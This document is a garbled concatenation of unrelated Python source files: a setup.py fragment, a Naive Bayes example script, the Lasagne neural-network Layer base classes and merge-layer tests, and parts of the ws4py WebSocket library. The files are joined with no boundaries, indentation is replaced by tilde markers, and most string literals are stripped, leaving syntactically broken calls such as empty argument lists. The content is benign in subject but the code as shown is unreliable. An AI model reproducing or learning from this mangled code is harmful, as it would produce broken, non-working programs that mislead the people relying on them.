folder = os . path . join ( root_folder , , , ) \n 
paths = os . listdir ( folder ) \n 
legacy_companies = [ path for path in paths \n 
if os . path . isdir ( os . path . join ( folder , path ) ) \n 
and os . path . exists ( os . path . join ( folder , path , ) ) ] \n 
\n 
\n 
setup ( name = , \n 
version = , \n 
license = , \n 
description = , \n 
long_description = long_description , \n 
keywords = , \n 
author = , \n 
author_email = , \n 
url = , \n 
packages = [ , \n 
, \n 
, \n 
, \n 
, \n 
] + \n 
[ + company for company in companies ] + \n 
[ + company for company in legacy_companies ] , \n 
test_suite = , \n 
install_requires = [ , \n 
, \n 
, \n 
] + requirements , \n 
zip_safe = False , \n 
platforms = , \n 
entry_points = { \n 
: [ \n 
, \n 
] , \n 
: [ \n 
, \n 
] \n 
} , \n 
classifiers = [ \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
\n 
] , \n 
scripts = [ , \n 
] , \n 
) \n 
__author__ = \n 
\n 
from learnpy . Problem import Problem \n 
\n 
# create a problem \n 
pro = Problem ( "BinaryClassification" , "./data/iris_training.csv" ) \n 
\n 
# set the predictor variable \n 
pro . set_label ( ) \n 
\n 
pro . set_model ( "NaiveBayes" ) \n 
pro . model . fit ( None ) \n 
\n 
pro . set_testing ( "./data/iris_testing.csv" ) \n 
pro . predict ( ) \n 
\n 
\n 
# new problem \n 
\n 
# create a problem \n 
pro2 = Problem ( "BinaryClassification" , "./data/lin_training.csv" ) \n 
\n 
# set the predictor variable \n 
pro2 . set_label ( ) \n 
\n 
pro2 . set_model ( "NaiveBayes" ) \n 
pro2 . model . fit ( None ) \n 
\n 
pro2 . set_testing ( "./data/lin_testing.csv" ) \n 
pro2 . predict ( ) from collections import OrderedDict \n 
\n 
import theano . tensor as T \n 
\n 
from . . import utils \n 
\n 
\n 
__all__ = [ \n 
"Layer" , \n 
"MergeLayer" , \n 
] \n 
\n 
\n 
# Layer base class \n 
\n 
class Layer ( object ) : \n 
~~~ """\n    The :class:`Layer` class represents a single layer of a neural network. It\n    should be subclassed when implementing new types of layers.\n\n    Because each layer can keep track of the layer(s) feeding into it, a\n    network\'s output :class:`Layer` instance can double as a handle to the full\n    network.\n\n    Parameters\n    ----------\n    incoming : a :class:`Layer` instance or a tuple\n        The layer feeding into this layer, or the expected input shape.\n    name : a string or None\n        An optional name to attach to this layer.\n    """ \n 
def __init__ ( self , incoming , name = None ) : \n 
~~~ if isinstance ( incoming , tuple ) : \n 
~~~ self . input_shape = incoming \n 
self . input_layer = None \n 
~~ else : \n 
~~~ self . input_shape = incoming . output_shape \n 
self . input_layer = incoming \n 
\n 
~~ self . name = name \n 
self . params = OrderedDict ( ) \n 
self . get_output_kwargs = [ ] \n 
\n 
if any ( d is not None and d <= 0 for d in self . input_shape ) : \n 
~~~ raise ValueError ( ( \n 
"Cannot create Layer with a non-positive input_shape " \n 
"dimension. input_shape=%r, self.name=%r" ) % ( \n 
self . input_shape , self . name ) ) \n 
\n 
~~ ~~ @ property \n 
def output_shape ( self ) : \n 
~~~ shape = self . get_output_shape_for ( self . input_shape ) \n 
if any ( isinstance ( s , T . Variable ) for s in shape ) : \n 
~~~ raise ValueError ( "%s returned a symbolic output shape from its " \n 
"get_output_shape_for() method: %r. This is not " \n 
"allowed; shapes must be tuples of integers for " \n 
"fixed-size dimensions and Nones for variable " \n 
"dimensions." % ( self . __class__ . __name__ , shape ) ) \n 
~~ return shape \n 
\n 
~~ def get_params ( self , ** tags ) : \n 
~~~ """\n        Returns a list of Theano shared variables that parameterize the layer.\n\n        By default, all shared variables that participate in the forward pass\n        will be returned (in the order they were registered in the Layer\'s\n        constructor via :meth:`add_param()`). The list can optionally be\n        filtered by specifying tags as keyword arguments. For example,\n        ``trainable=True`` will only return trainable parameters, and\n        ``regularizable=True`` will only return parameters that can be\n        regularized (e.g., by L2 decay).\n\n        If any of the layer\'s parameters was set to a Theano expression instead\n        of a shared variable, the shared variables involved in that expression\n        will be returned rather than the expression itself. Tag filtering\n        considers all variables within an expression to be tagged the same.\n\n        Parameters\n        ----------\n        **tags (optional)\n            tags can be specified to filter the list. Specifying ``tag1=True``\n            will limit the list to parameters that are tagged with ``tag1``.\n            Specifying ``tag1=False`` will limit the list to parameters that\n            are not tagged with ``tag1``. Commonly used tags are\n            ``regularizable`` and ``trainable``.\n\n        Returns\n        -------\n        list of Theano shared variables\n            A list of variables that parameterize the layer\n\n        Notes\n        -----\n        For layers without any parameters, this will return an empty list.\n        """ \n 
result = list ( self . params . keys ( ) ) \n 
\n 
only = set ( tag for tag , value in tags . items ( ) if value ) \n 
if only : \n 
# retain all parameters that have all of the tags in `only` \n 
~~~ result = [ param for param in result \n 
if not ( only - self . params [ param ] ) ] \n 
\n 
~~ exclude = set ( tag for tag , value in tags . items ( ) if not value ) \n 
if exclude : \n 
# retain all parameters that have none of the tags in `exclude` \n 
~~~ result = [ param for param in result \n 
if not ( self . params [ param ] & exclude ) ] \n 
\n 
~~ return utils . collect_shared_vars ( result ) \n 
\n 
~~ def get_output_shape_for ( self , input_shape ) : \n 
~~~ """\n        Computes the output shape of this layer, given an input shape.\n\n        Parameters\n        ----------\n        input_shape : tuple\n            A tuple representing the shape of the input. The tuple should have\n            as many elements as there are input dimensions, and the elements\n            should be integers or `None`.\n\n        Returns\n        -------\n        tuple\n            A tuple representing the shape of the output of this layer. The\n            tuple has as many elements as there are output dimensions, and the\n            elements are all either integers or `None`.\n\n        Notes\n        -----\n        This method will typically be overridden when implementing a new\n        :class:`Layer` class. By default it simply returns the input\n        shape. This means that a layer that does not modify the shape\n        (e.g. because it applies an elementwise operation) does not need\n        to override this method.\n        """ \n 
return input_shape \n 
\n 
~~ def get_output_for ( self , input , ** kwargs ) : \n 
~~~ """\n        Propagates the given input through this layer (and only this layer).\n\n        Parameters\n        ----------\n        input : Theano expression\n            The expression to propagate through this layer.\n\n        Returns\n        -------\n        output : Theano expression\n            The output of this layer given the input to this layer.\n\n\n        Notes\n        -----\n        This is called by the base :meth:`lasagne.layers.get_output()`\n        to propagate data through a network.\n\n        This method should be overridden when implementing a new\n        :class:`Layer` class. By default it raises `NotImplementedError`.\n        """ \n 
raise NotImplementedError \n 
\n 
~~ def add_param ( self , spec , shape , name = None , ** tags ) : \n 
~~~ """\n        Register and possibly initialize a parameter tensor for the layer.\n\n        When defining a layer class, this method is called in the constructor\n        to define which parameters the layer has, what their shapes are, how\n        they should be initialized and what tags are associated with them.\n        This allows layer classes to transparently support parameter\n        initialization from numpy arrays and callables, as well as setting\n        parameters to existing Theano shared variables or Theano expressions.\n\n        All registered parameters are stored along with their tags in the\n        ordered dictionary :attr:`Layer.params`, and can be retrieved with\n        :meth:`Layer.get_params()`, optionally filtered by their tags.\n\n        Parameters\n        ----------\n        spec : Theano shared variable, expression, numpy array or callable\n            initial value, expression or initializer for this parameter.\n            See :func:`lasagne.utils.create_param` for more information.\n\n        shape : tuple of int\n            a tuple of integers representing the desired shape of the\n            parameter tensor.\n\n        name : str (optional)\n            a descriptive name for the parameter variable. This will be passed\n            to ``theano.shared`` when the variable is created, prefixed by the\n            layer\'s name if any (in the form ``\'layer_name.param_name\'``). If\n            ``spec`` is already a shared variable or expression, this parameter\n            will be ignored to avoid overwriting an existing name.\n\n        **tags (optional)\n            tags associated with the parameter can be specified as keyword\n            arguments. To associate the tag ``tag1`` with the parameter, pass\n            ``tag1=True``.\n\n            By default, the tags ``regularizable`` and ``trainable`` are\n            associated with the parameter. Pass ``regularizable=False`` or\n            ``trainable=False`` respectively to prevent this.\n\n        Returns\n        -------\n        Theano shared variable or Theano expression\n            the resulting parameter variable or parameter expression\n\n        Notes\n        -----\n        It is recommended to assign the resulting parameter variable/expression\n        to an attribute of the layer for easy access, for example:\n\n        >>> self.W = self.add_param(W, (2, 3), name=\'W\')  #doctest: +SKIP\n        """ \n 
# prefix the param name with the layer name if it exists \n 
if name is not None : \n 
~~~ if self . name is not None : \n 
~~~ name = "%s.%s" % ( self . name , name ) \n 
# create shared variable, or pass through given variable/expression \n 
~~ ~~ param = utils . create_param ( spec , shape , name ) \n 
# parameters should be trainable and regularizable by default \n 
tags [ ] = tags . get ( , True ) \n 
tags [ ] = tags . get ( , True ) \n 
self . params [ param ] = set ( tag for tag , value in tags . items ( ) if value ) \n 
\n 
return param \n 
\n 
\n 
~~ ~~ class MergeLayer ( Layer ) : \n 
~~~ """\n    This class represents a layer that aggregates input from multiple layers.\n    It should be subclassed when implementing new types of layers that obtain\n    their input from multiple layers.\n\n    Parameters\n    ----------\n    incomings : a list of :class:`Layer` instances or tuples\n        The layers feeding into this layer, or expected input shapes.\n    name : a string or None\n        An optional name to attach to this layer.\n    """ \n 
def __init__ ( self , incomings , name = None ) : \n 
~~~ self . input_shapes = [ incoming if isinstance ( incoming , tuple ) \n 
else incoming . output_shape \n 
for incoming in incomings ] \n 
self . input_layers = [ None if isinstance ( incoming , tuple ) \n 
else incoming \n 
for incoming in incomings ] \n 
self . name = name \n 
self . params = OrderedDict ( ) \n 
self . get_output_kwargs = [ ] \n 
\n 
~~ @ Layer . output_shape . getter \n 
def output_shape ( self ) : \n 
~~~ shape = self . get_output_shape_for ( self . input_shapes ) \n 
if any ( isinstance ( s , T . Variable ) for s in shape ) : \n 
~~~ raise ValueError ( "%s returned a symbolic output shape from its " \n 
"get_output_shape_for() method: %r. This is not " \n 
"allowed; shapes must be tuples of integers for " \n 
"fixed-size dimensions and Nones for variable " \n 
"dimensions." % ( self . __class__ . __name__ , shape ) ) \n 
~~ return shape \n 
\n 
~~ def get_output_shape_for ( self , input_shapes ) : \n 
~~~ """\n        Computes the output shape of this layer, given a list of input shapes.\n\n        Parameters\n        ----------\n        input_shape : list of tuple\n            A list of tuples, with each tuple representing the shape of one of\n            the inputs (in the correct order). These tuples should have as many\n            elements as there are input dimensions, and the elements should be\n            integers or `None`.\n\n        Returns\n        -------\n        tuple\n            A tuple representing the shape of the output of this layer. The\n            tuple has as many elements as there are output dimensions, and the\n            elements are all either integers or `None`.\n\n        Notes\n        -----\n        This method must be overridden when implementing a new\n        :class:`Layer` class with multiple inputs. By default it raises\n        `NotImplementedError`.\n        """ \n 
raise NotImplementedError \n 
\n 
~~ def get_output_for ( self , inputs , ** kwargs ) : \n 
~~~ """\n        Propagates the given inputs through this layer (and only this layer).\n\n        Parameters\n        ----------\n        inputs : list of Theano expressions\n            The Theano expressions to propagate through this layer.\n\n        Returns\n        -------\n        Theano expressions\n            The output of this layer given the inputs to this layer.\n\n        Notes\n        -----\n        This is called by the base :meth:`lasagne.layers.get_output()`\n        to propagate data through a network.\n\n        This method should be overridden when implementing a new\n        :class:`Layer` class with multiple inputs. By default it raises\n        `NotImplementedError`.\n        """ \n 
raise NotImplementedError \n 
~~ ~~ from mock import Mock \n 
import numpy \n 
import pytest \n 
import theano \n 
\n 
\n 
class TestAutocrop : \n 
# Test internal helper methods of MergeCropLayer \n 
~~~ def test_autocrop_array_shapes ( self ) : \n 
~~~ from lasagne . layers . merge import autocrop_array_shapes \n 
crop0 = None \n 
crop1 = [ None , , , ] \n 
# Too few crop modes; should get padded with None \n 
crop2 = [ , ] \n 
# Invalid crop modes \n 
crop_bad = [ , , , ] \n 
\n 
assert autocrop_array_shapes ( \n 
[ ( 1 , 2 , 3 , 4 ) , ( 5 , 6 , 7 , 8 ) , ( 5 , 4 , 3 , 2 ) ] , crop0 ) == [ ( 1 , 2 , 3 , 4 ) , ( 5 , 6 , 7 , 8 ) , ( 5 , 4 , 3 , 2 ) ] \n 
assert autocrop_array_shapes ( \n 
[ ( 1 , 2 , 3 , 4 ) , ( 5 , 6 , 7 , 8 ) , ( 5 , 4 , 3 , 2 ) ] , crop1 ) == [ ( 1 , 2 , 3 , 2 ) , ( 5 , 2 , 3 , 2 ) , ( 5 , 2 , 3 , 2 ) ] \n 
assert autocrop_array_shapes ( \n 
[ ( 1 , 2 , 3 , 4 ) , ( 5 , 6 , 7 , 8 ) , ( 5 , 4 , 3 , 2 ) ] , crop2 ) == [ ( 1 , 2 , 3 , 4 ) , ( 1 , 2 , 7 , 8 ) , ( 1 , 2 , 3 , 2 ) ] \n 
\n 
with pytest . raises ( ValueError ) : \n 
~~~ autocrop_array_shapes ( \n 
[ ( 1 , 2 , 3 , 4 ) , ( 5 , 6 , 7 , 8 ) , ( 5 , 4 , 3 , 2 ) ] , crop_bad ) \n 
\n 
# Inconsistent dimensionality \n 
~~ with pytest . raises ( ValueError ) : \n 
~~~ autocrop_array_shapes ( \n 
[ ( 1 , 2 , 3 , 4 ) , ( 5 , 6 , 7 ) , ( 5 , 4 , 3 , 2 , 10 ) ] , crop1 ) \n 
\n 
~~ ~~ def test_crop_inputs ( self ) : \n 
~~~ from lasagne . layers . merge import autocrop \n 
from numpy . testing import assert_array_equal \n 
crop_0 = None \n 
crop_1 = [ None , , , ] \n 
crop_l = [ , , , ] \n 
crop_c = [ , , , ] \n 
crop_u = [ , , , ] \n 
crop_x = [ , ] \n 
crop_bad = [ , , , ] \n 
\n 
x0 = numpy . random . random ( ( 2 , 3 , 5 , 7 ) ) \n 
x1 = numpy . random . random ( ( 1 , 2 , 3 , 4 ) ) \n 
x2 = numpy . random . random ( ( 6 , 3 , 4 , 2 ) ) \n 
\n 
def crop_test ( cropping , inputs , expected ) : \n 
~~~ inputs = [ theano . shared ( x ) for x in inputs ] \n 
outs = autocrop ( inputs , cropping ) \n 
outs = [ o . eval ( ) for o in outs ] \n 
assert len ( outs ) == len ( expected ) \n 
for o , e in zip ( outs , expected ) : \n 
~~~ assert_array_equal ( o , e ) \n 
\n 
~~ ~~ crop_test ( crop_0 , [ x0 , x1 ] , \n 
[ x0 , x1 ] ) \n 
crop_test ( crop_1 , [ x0 , x1 ] , \n 
[ x0 [ : , : 2 , 1 : 4 , 3 : ] , x1 [ : , : , : , : ] ] ) \n 
crop_test ( crop_l , [ x0 , x1 ] , \n 
[ x0 [ : 1 , : 2 , : 3 , : 4 ] , x1 [ : , : , : , : ] ] ) \n 
crop_test ( crop_c , [ x0 , x1 ] , \n 
[ x0 [ : 1 , : 2 , 1 : 4 , 1 : 5 ] , x1 [ : , : , : , : ] ] ) \n 
crop_test ( crop_u , [ x0 , x1 ] , \n 
[ x0 [ 1 : , 1 : , 2 : , 3 : ] , x1 [ : , : , : , : ] ] ) \n 
\n 
crop_test ( crop_0 , [ x0 , x2 ] , \n 
[ x0 , x2 ] ) \n 
crop_test ( crop_1 , [ x0 , x2 ] , \n 
[ x0 [ : , : , : 4 , 5 : ] , x2 [ : , : , : , : ] ] ) \n 
crop_test ( crop_l , [ x0 , x2 ] , \n 
[ x0 [ : , : , : 4 , : 2 ] , x2 [ : 2 , : , : , : ] ] ) \n 
crop_test ( crop_c , [ x0 , x2 ] , \n 
[ x0 [ : , : , : 4 , 2 : 4 ] , x2 [ 2 : 4 , : , : , : ] ] ) \n 
crop_test ( crop_u , [ x0 , x2 ] , \n 
[ x0 [ : , : , 1 : , 5 : ] , x2 [ 4 : , : , : , : ] ] ) \n 
\n 
crop_test ( crop_0 , [ x0 , x1 , x2 ] , \n 
[ x0 , x1 , x2 ] ) \n 
crop_test ( crop_1 , [ x0 , x1 , x2 ] , \n 
[ x0 [ : , : 2 , 1 : 4 , 5 : ] , x1 [ : , : , : , 2 : ] , x2 [ : , : 2 , : 3 , : ] ] ) \n 
crop_test ( crop_l , [ x0 , x1 , x2 ] , \n 
[ x0 [ : 1 , : 2 , : 3 , : 2 ] , x1 [ : , : , : , : 2 ] , x2 [ : 1 , : 2 , : 3 , : ] ] ) \n 
crop_test ( crop_c , [ x0 , x1 , x2 ] , \n 
[ x0 [ : 1 , : 2 , 1 : 4 , 2 : 4 ] , x1 [ : , : , : , 1 : 3 ] , x2 [ 2 : 3 , : 2 , : 3 , : ] ] ) \n 
crop_test ( crop_u , [ x0 , x1 , x2 ] , \n 
[ x0 [ 1 : , 1 : , 2 : , 5 : ] , x1 [ : , : , : , 2 : ] , x2 [ 5 : , 1 : , 1 : , : ] ] ) \n 
\n 
crop_test ( crop_x , [ x0 , x1 , x2 ] , \n 
[ x0 [ : 1 , : 2 , : , : ] , x1 [ : 1 , : 2 , : , : ] , x2 [ : 1 , : 2 , : , : ] ] ) \n 
\n 
# test that num outputs is correct when the number of inputs is \n 
# larger than ndim of the inputs. \n 
crop_test ( crop_x , [ x0 , x1 , x2 , x0 , x1 , x2 ] , \n 
[ x0 [ : 1 , : 2 , : , : ] , x1 [ : 1 , : 2 , : , : ] , x2 [ : 1 , : 2 , : , : ] , \n 
x0 [ : 1 , : 2 , : , : ] , x1 [ : 1 , : 2 , : , : ] , x2 [ : 1 , : 2 , : , : ] ] ) \n 
\n 
with pytest . raises ( ValueError ) : \n 
~~~ crop_test ( crop_bad , [ x0 , x1 , x2 ] , \n 
[ x0 [ : 1 , : 2 , : , : ] , x1 [ : 1 , : 2 , : , : ] , x2 [ : 1 , : 2 , : , : ] ] ) \n 
\n 
# Inconsistent dimensionality \n 
~~ with pytest . raises ( ValueError ) : \n 
~~~ crop_test ( crop_bad , [ x0 [ : , : , : , 0 ] , x1 , x2 [ : , : , : , : , None ] ] , \n 
[ x0 [ : 1 , : 2 , : , : ] , x1 [ : 1 , : 2 , : , : ] , x2 [ : 1 , : 2 , : , : ] ] ) \n 
\n 
\n 
~~ ~~ ~~ class TestConcatLayer : \n 
~~~ @ pytest . fixture \n 
def layer ( self ) : \n 
~~~ from lasagne . layers . merge import ConcatLayer \n 
return ConcatLayer ( [ Mock ( ) , Mock ( ) ] , axis = 1 ) \n 
\n 
~~ @ pytest . fixture \n 
def crop_layer_0 ( self ) : \n 
~~~ from lasagne . layers . merge import ConcatLayer \n 
return ConcatLayer ( [ Mock ( ) , Mock ( ) ] , axis = 0 , \n 
cropping = [ ] * 2 ) \n 
\n 
~~ @ pytest . fixture \n 
def crop_layer_1 ( self ) : \n 
~~~ from lasagne . layers . merge import ConcatLayer \n 
return ConcatLayer ( [ Mock ( ) , Mock ( ) ] , axis = 1 , \n 
cropping = [ ] * 2 ) \n 
\n 
~~ def test_get_output_shape_for ( self , layer ) : \n 
~~~ assert layer . get_output_shape_for ( [ ( 3 , 2 ) , ( 3 , 5 ) ] ) == ( 3 , 7 ) \n 
assert layer . get_output_shape_for ( [ ( 3 , 2 ) , ( 3 , None ) ] ) == ( 3 , None ) \n 
assert layer . get_output_shape_for ( [ ( None , 2 ) , ( 3 , 5 ) ] ) == ( 3 , 7 ) \n 
assert layer . get_output_shape_for ( [ ( None , 2 ) , ( None , 5 ) ] ) == ( None , 7 ) \n 
with pytest . raises ( ValueError ) : \n 
~~~ layer . get_output_shape_for ( [ ( 4 , None ) , ( 3 , 5 ) ] ) \n 
~~ with pytest . raises ( ValueError ) : \n 
~~~ layer . get_output_shape_for ( [ ( 3 , 2 ) , ( 4 , None ) ] ) \n 
~~ with pytest . raises ( ValueError ) : \n 
~~~ layer . get_output_shape_for ( [ ( None , 2 ) , ( 3 , 5 ) , ( 4 , 5 ) ] ) \n 
\n 
~~ ~~ def test_get_output_shape_for_cropped ( self , crop_layer_0 , crop_layer_1 ) : \n 
~~~ input_shapes = [ ( 3 , 2 ) , ( 4 , 5 ) ] \n 
result_0 = crop_layer_0 . get_output_shape_for ( input_shapes ) \n 
result_1 = crop_layer_1 . get_output_shape_for ( input_shapes ) \n 
assert result_0 == ( 7 , 2 ) \n 
assert result_1 == ( 3 , 7 ) \n 
\n 
~~ def test_get_output_for ( self , layer ) : \n 
~~~ inputs = [ theano . shared ( numpy . ones ( ( 3 , 3 ) ) ) , \n 
theano . shared ( numpy . ones ( ( 3 , 2 ) ) ) ] \n 
result = layer . get_output_for ( inputs ) \n 
result_eval = result . eval ( ) \n 
desired_result = numpy . hstack ( [ input . get_value ( ) for input in inputs ] ) \n 
assert ( result_eval == desired_result ) . all ( ) \n 
\n 
~~ def test_get_output_for_cropped ( self , crop_layer_0 , crop_layer_1 ) : \n 
~~~ x0 = numpy . random . random ( ( 5 , 3 ) ) \n 
x1 = numpy . random . random ( ( 4 , 2 ) ) \n 
inputs = [ theano . shared ( x0 ) , \n 
theano . shared ( x1 ) ] \n 
result_0 = crop_layer_0 . get_output_for ( inputs ) . eval ( ) \n 
result_1 = crop_layer_1 . get_output_for ( inputs ) . eval ( ) \n 
desired_result_0 = numpy . concatenate ( [ x0 [ : , : 2 ] , x1 [ : , : 2 ] ] , axis = 0 ) \n 
desired_result_1 = numpy . concatenate ( [ x0 [ : 4 , : ] , x1 [ : 4 , : ] ] , axis = 1 ) \n 
assert ( result_0 == desired_result_0 ) . all ( ) \n 
assert ( result_1 == desired_result_1 ) . all ( ) \n 
\n 
\n 
~~ ~~ class TestElemwiseSumLayer : \n 
~~~ @ pytest . fixture \n 
def layer ( self ) : \n 
~~~ from lasagne . layers . merge import ElemwiseSumLayer \n 
return ElemwiseSumLayer ( [ Mock ( ) , Mock ( ) ] , coeffs = [ 2 , - 1 ] ) \n 
\n 
~~ @ pytest . fixture \n 
def crop_layer ( self ) : \n 
~~~ from lasagne . layers . merge import ElemwiseSumLayer \n 
return ElemwiseSumLayer ( [ Mock ( ) , Mock ( ) ] , coeffs = [ 2 , - 1 ] , \n 
cropping = [ ] * 2 ) \n 
\n 
~~ def test_get_output_shape_for ( self , layer ) : \n 
~~~ assert layer . get_output_shape_for ( [ ( 3 , 2 ) , ( 3 , 2 ) ] ) == ( 3 , 2 ) \n 
assert layer . get_output_shape_for ( [ ( 3 , 2 ) , ( 3 , None ) ] ) == ( 3 , 2 ) \n 
assert layer . get_output_shape_for ( [ ( None , 2 ) , ( 3 , 2 ) ] ) == ( 3 , 2 ) \n 
assert layer . get_output_shape_for ( [ ( None , 2 ) , ( None , 2 ) ] ) == ( None , 2 ) \n 
with pytest . raises ( ValueError ) : \n 
~~~ layer . get_output_shape_for ( [ ( 3 , None ) , ( 4 , 2 ) ] ) \n 
~~ with pytest . raises ( ValueError ) : \n 
~~~ layer . get_output_shape_for ( [ ( 3 , 2 ) , ( 4 , None ) ] ) \n 
~~ with pytest . raises ( ValueError ) : \n 
~~~ layer . get_output_shape_for ( [ ( None , 2 ) , ( 3 , 2 ) , ( 4 , 2 ) ] ) \n 
\n 
~~ ~~ def test_get_output_for ( self , layer ) : \n 
~~~ a = numpy . array ( [ [ 0 , 1 ] , [ 2 , 3 ] ] ) \n 
b = numpy . array ( [ [ 1 , 2 ] , [ 4 , 5 ] ] ) \n 
inputs = [ theano . shared ( a ) , \n 
theano . shared ( b ) ] \n 
result = layer . get_output_for ( inputs ) \n 
result_eval = result . eval ( ) \n 
desired_result = 2 * a - b \n 
assert ( result_eval == desired_result ) . all ( ) \n 
\n 
~~ def test_get_output_for_cropped ( self , crop_layer ) : \n 
~~~ from numpy . testing import assert_array_almost_equal as aeq \n 
x0 = numpy . random . random ( ( 5 , 3 ) ) \n 
x1 = numpy . random . random ( ( 4 , 2 ) ) \n 
inputs = [ theano . shared ( x0 ) , \n 
theano . shared ( x1 ) ] \n 
result = crop_layer . get_output_for ( inputs ) . eval ( ) \n 
desired_result = 2 * x0 [ : 4 , : 2 ] - x1 [ : 4 , : 2 ] \n 
aeq ( result , desired_result ) \n 
\n 
~~ def test_bad_coeffs_fails ( self , layer ) : \n 
~~~ from lasagne . layers . merge import ElemwiseSumLayer \n 
with pytest . raises ( ValueError ) : \n 
~~~ ElemwiseSumLayer ( [ Mock ( ) , Mock ( ) ] , coeffs = [ 2 , 3 , - 1 ] ) \n 
\n 
\n 
~~ ~~ ~~ class TestElemwiseMergeLayerMul : \n 
~~~ @ pytest . fixture \n 
def layer ( self ) : \n 
~~~ import theano . tensor as T \n 
from lasagne . layers . merge import ElemwiseMergeLayer \n 
return ElemwiseMergeLayer ( [ Mock ( ) , Mock ( ) ] , merge_function = T . mul ) \n 
\n 
~~ def test_get_output_for ( self , layer ) : \n 
~~~ a = numpy . array ( [ [ 0 , 1 ] , [ 2 , 3 ] ] ) \n 
b = numpy . array ( [ [ 1 , 2 ] , [ 4 , 5 ] ] ) \n 
inputs = [ theano . shared ( a ) , \n 
theano . shared ( b ) ] \n 
result = layer . get_output_for ( inputs ) \n 
result_eval = result . eval ( ) \n 
desired_result = a * b \n 
assert ( result_eval == desired_result ) . all ( ) \n 
\n 
\n 
~~ ~~ class TestElemwiseMergeLayerMaximum : \n 
~~~ @ pytest . fixture \n 
def layer ( self ) : \n 
~~~ import theano . tensor as T \n 
from lasagne . layers . merge import ElemwiseMergeLayer \n 
return ElemwiseMergeLayer ( [ Mock ( ) , Mock ( ) ] , merge_function = T . maximum ) \n 
\n 
~~ def test_get_output_for ( self , layer ) : \n 
~~~ a = numpy . array ( [ [ 0 , 1 ] , [ 2 , 3 ] ] ) \n 
b = numpy . array ( [ [ 1 , 2 ] , [ 4 , 5 ] ] ) \n 
inputs = [ theano . shared ( a ) , \n 
theano . shared ( b ) ] \n 
result = layer . get_output_for ( inputs ) \n 
result_eval = result . eval ( ) \n 
desired_result = numpy . maximum ( a , b ) \n 
assert ( result_eval == desired_result ) . all ( ) \n 
# -*- coding: utf-8 -*- \n 
~~ ~~ from gevent import monkey ; monkey . patch_all ( ) \n 
\n 
import gevent \n 
from ws4py . client . geventclient import WebSocketClient \n 
\n 
if __name__ == : \n 
~~~ ws = WebSocketClient ( , protocols = [ , ] ) \n 
ws . connect ( ) \n 
\n 
ws . send ( "Hello world" ) \n 
print ( ( ws . receive ( ) , ) ) \n 
\n 
ws . send ( "Hello world again" ) \n 
print ( ( ws . receive ( ) , ) ) \n 
\n 
def incoming ( ) : \n 
~~~ while True : \n 
~~~ m = ws . receive ( ) \n 
if m is not None : \n 
~~~ m = str ( m ) \n 
print ( ( m , len ( m ) ) ) \n 
if len ( m ) == 35 : \n 
~~~ ws . close ( ) \n 
break \n 
~~ ~~ else : \n 
~~~ break \n 
~~ ~~ print ( ( "Connection closed!" , ) ) \n 
\n 
~~ def outgoing ( ) : \n 
~~~ for i in range ( 0 , 40 , 5 ) : \n 
~~~ ws . send ( "*" * i ) \n 
\n 
\n 
~~ ws . send ( "Foobar" ) \n 
\n 
~~ greenlets = [ \n 
gevent . spawn ( incoming ) , \n 
gevent . spawn ( outgoing ) , \n 
] \n 
gevent . joinall ( greenlets ) \n 
# -*- coding: utf-8 -*- \n 
~~ import os \n 
import struct \n 
\n 
from ws4py . framing import Frame , OPCODE_CONTINUATION , OPCODE_TEXT , OPCODE_BINARY , OPCODE_CLOSE , OPCODE_PING , OPCODE_PONG \n 
from ws4py . compat import unicode , py3k \n 
\n 
__all__ = [ , , , , \n 
, ] \n 
\n 
class Message ( object ) : \n 
~~~ def __init__ ( self , opcode , data = , encoding = ) : \n 
~~~ """\n        A message is a application level entity. It\'s usually built\n        from one or many frames. The protocol defines several kind\n        of messages which are grouped into two sets:\n\n        * data messages which can be text or binary typed\n        * control messages which provide a mechanism to perform\n          in-band control communication between peers\n\n        The ``opcode`` indicates the message type and ``data`` is\n        the possible message payload.\n\n        The payload is held internally as a a :func:`bytearray` as they are\n        faster than pure strings for append operations.\n\n        Unicode data will be encoded using the provided ``encoding``.\n        """ \n 
self . opcode = opcode \n 
self . _completed = False \n 
self . encoding = encoding \n 
\n 
if isinstance ( data , unicode ) : \n 
~~~ if not encoding : \n 
~~~ raise TypeError ( "unicode data without an encoding" ) \n 
~~ data = data . encode ( encoding ) \n 
~~ elif isinstance ( data , bytearray ) : \n 
~~~ data = bytes ( data ) \n 
~~ elif not isinstance ( data , bytes ) : \n 
~~~ raise TypeError ( "%s is not a supported data type" % type ( data ) ) \n 
\n 
~~ self . data = data \n 
\n 
~~ def single ( self , mask = False ) : \n 
~~~ """\n        Returns a frame bytes with the fin bit set and a random mask.\n\n        If ``mask`` is set, automatically mask the frame\n        using a generated 4-byte token.\n        """ \n 
mask = os . urandom ( 4 ) if mask else None \n 
return Frame ( body = self . data , opcode = self . opcode , \n 
masking_key = mask , fin = 1 ) . build ( ) \n 
\n 
~~ def fragment ( self , first = False , last = False , mask = False ) : \n 
~~~ """\n        Returns a :class:`ws4py.framing.Frame` bytes.\n\n        The behavior depends on the given flags:\n\n        * ``first``: the frame uses ``self.opcode`` else a continuation opcode\n        * ``last``: the frame has its ``fin`` bit set\n        * ``mask``: the frame is masked using a automatically generated 4-byte token\n        """ \n 
fin = 1 if last is True else 0 \n 
opcode = self . opcode if first is True else OPCODE_CONTINUATION \n 
mask = os . urandom ( 4 ) if mask else None \n 
return Frame ( body = self . data , \n 
opcode = opcode , masking_key = mask , \n 
fin = fin ) . build ( ) \n 
\n 
~~ @ property \n 
def completed ( self ) : \n 
~~~ """\n        Indicates the the message is complete, meaning\n        the frame\'s ``fin`` bit was set.\n        """ \n 
return self . _completed \n 
\n 
~~ @ completed . setter \n 
def completed ( self , state ) : \n 
~~~ """\n        Sets the state for this message. Usually\n        set by the stream\'s parser.\n        """ \n 
self . _completed = state \n 
\n 
~~ def extend ( self , data ) : \n 
~~~ """\n        Add more ``data`` to the message.\n        """ \n 
if isinstance ( data , bytes ) : \n 
~~~ self . data += data \n 
~~ elif isinstance ( data , bytearray ) : \n 
~~~ self . data += bytes ( data ) \n 
~~ elif isinstance ( data , unicode ) : \n 
~~~ self . data += data . encode ( self . encoding ) \n 
~~ else : \n 
~~~ raise TypeError ( "%s is not a supported data type" % type ( data ) ) \n 
\n 
~~ ~~ def __len__ ( self ) : \n 
~~~ return len ( self . __unicode__ ( ) ) \n 
\n 
~~ def __str__ ( self ) : \n 
~~~ if py3k : \n 
~~~ return self . data . decode ( self . encoding ) \n 
~~ return self . data \n 
\n 
~~ def __unicode__ ( self ) : \n 
~~~ return self . data . decode ( self . encoding ) \n 
\n 
~~ ~~ class TextMessage ( Message ) : \n 
